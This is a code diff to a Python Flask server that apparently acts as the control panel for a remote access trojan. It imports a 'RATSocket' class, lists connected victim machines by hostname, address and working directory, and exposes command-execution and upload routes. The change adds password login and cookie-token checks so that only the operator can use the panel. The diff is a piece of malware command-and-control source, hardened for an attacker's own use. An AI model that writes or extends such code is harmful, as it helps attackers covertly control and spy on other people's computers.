@@ -12,7 +12,8 @@ from common.ratsocket import RATSocket
 from common.util import get_write_stream
 from common.util import logger
 from server.client import Client
-from server.config import SOCKET_ADDR
+from server.config import SOCKET_ADDR, PASSWORD
+from server.web_util import *
 
 
 class Server:
@@ -87,10 +88,16 @@ def recv(conn):
 
 @app.route('/list', methods=['POST'])
 def list_connections():
+    token = request.cookies.get('token')
+    state, msg = validate_token(token)
+    if not state:
+        resp = jsonify(state=state, msg=msg)
+        resp.set_cookie('token', '', expires=0)
+        return resp
     connections = []
     for k, v in server.connections.items():
         connections.append({'id': k, 'hostname': v.info['hostname'], 'address': v.info['addr'], 'cwd': v.info['cwd']})
-    return jsonify(connections)
+    return jsonify(state=True, details=connections)
 
 
 @app.route('/execute', methods=['POST'])
@@ -164,6 +171,18 @@ def upload():
             time.sleep(0.1)
     except Exception as e:
         return str(e)
+
+
+@app.route('/auth', methods=['POST'])
+def auth():
+    password = request.get_json()['password']
+    if password == PASSWORD:
+        token = generate_token()
+        response = jsonify(state=1, msg='Success')
+        response.set_cookie('token', token)
+        return response
+    else:
+        return jsonify(state=0, msg='Incorrect password')
 
 
 if __name__ == '__main__':
